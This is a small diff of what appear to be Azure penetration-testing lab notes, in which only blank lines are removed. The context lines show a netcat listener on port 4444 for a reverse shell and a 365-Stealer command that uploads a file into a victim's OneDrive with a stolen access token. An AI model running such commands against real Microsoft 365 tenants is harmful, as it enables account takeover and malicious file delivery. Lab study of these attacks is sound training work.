@@ -193,8 +193,6 @@ C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444
 & 'C:\Program Files\Python38\python.exe' C:\xampp\htdocs\365-Stealer\365-Stealer.py --upload C:\AzAD\Tools\studentx.doc --token-path C:\xampp\htdocs\365-Stealer\yourVictims\MarkDWalden@defcorphq.onmicrosoft.com\access_token.txt
 ```
 
-
-
 # Authenticated enumeration
 ## Enumeration through Azure portal
 #### Login azure portal
